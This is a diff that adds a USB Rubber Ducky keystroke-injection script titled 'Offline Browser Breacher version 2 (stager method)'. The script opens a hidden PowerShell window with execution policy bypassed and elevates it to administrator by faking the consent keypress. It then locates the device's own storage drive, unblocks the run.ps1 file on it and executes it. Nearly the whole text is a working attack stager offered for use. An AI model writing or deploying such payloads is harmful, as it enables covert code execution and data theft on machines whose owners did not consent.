@@ -1,0 +1,26 @@
+REM_BLOCK
+    TITLE: Offline Browser Breacher version 2 (stager method)
+    AUTHOR: Szymon Stefański
+    DESCRIPTION: Bypasses network filters by running a stager script, that runs PowerShell program on target machine directly from Ducky.
+END_REM
+
+DEFAULT_DELAY 100
+
+ATTACKMODE HID STORAGE
+
+BUTTON_DEF
+    GUI r
+    DELAY 500
+    REM This line down here open PowerShell in silent mode with no window, bypassing restrictions for scripts
+    STRING powershell -ep bypass -NoProfile -w h
+    CTRL-SHIFT ENTER
+    DELAY 1500
+    ALT y
+    DELAY 3000
+    REM We unblock the PowerShell script to make sure it won't be interrupt during running
+    STRINGLN $d=(gwmi Win32_Volume -f 'DriveType=2').DriveLetter;
+    DELAY 1000
+    STRINGLN Unblock-File $d\run.ps1;
+    DELAY 1000
+    STRINGLN & $d\run.ps1;
+END_BUTTON
